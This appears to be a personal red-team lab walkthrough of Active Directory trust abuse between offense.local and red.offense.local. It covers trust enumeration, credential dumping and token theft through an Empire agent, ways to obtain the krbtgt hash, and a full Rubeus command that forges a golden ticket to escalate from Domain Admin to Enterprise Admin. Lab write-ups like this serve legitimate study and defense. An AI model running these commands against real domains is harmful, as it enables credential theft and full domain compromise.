Trusts between the two domains could be checked from powershell by issuing:

```
Get-ADTrust -Filter *
```

The first console shows the domain trust relationship from `offense.local` perspective and the second one from `red.offense.local`. Note the the direction is `BiDirectional` which means that members can authenticate from one domain to another when they want to access shared resources:
![[Pasted image 20240917081626.png]]
Similar, but very simplified information could be gleaned from a native Windows binary:

```
nltest /domain_trusts
```


Assume we got our first agent back from the computer `PC-MANTVYDAS$`:

Credential Dumping

Since the agent is running within a high integrity process, let's dump credentials - some interesting credentials can be observed for a user in `red.offense.local` domain:
![[Pasted image 20240917082037.png]]

We succesfully change to that user stealing the token

## DC Recon

After assuming privileges of the member red\spotless, let's get the Domain Controller computer name for that user. Again, my Empire instance is buggy, so I used a custom command to get it:
```
run [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | ForEach-Object { $_.Name }
```
![[image.png]]
Check access
```
dir \\dc-red.red.offense.local\c$
```
![[image 1.png]]

Jump to DC
Once in DC-RED, let's check any domain trust relationships:
```
Get-ADTrust -Filter *
```
![[Pasted image 20240917082800.png]]
## From DA to EA

We will now try to escalate from DA in `red.offense.local` to EA in `offense.local`. We need to create a golden ticket for `red.offense.local` and forge it to make us an EA in `offense.local`.
The NTLM hash and SID of the **krbtgt** account can be obtained via the following methods: 

1. DCSync (Mimikatz)
2. LSA (Mimikatz)
3. Hashdump (Meterpreter)
4. NTDS.DIT
5. DCSync (Kiwi)

Forge the ticket
`rubeus.exe golden /user:<any_username> /domain:<domain_name> /sid<domain_sid> /rc4:<krbtgt_ntlm_hash> /ptt`
example:
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:3797db48777612dbaf6e5d6436a22739a1efc74c791d0898379eb5ea2d788e26 /user:Administrator /domain:acme.corp /sid:S-1-5-21-951568539-2129440919-2691824384 /nowrap
```
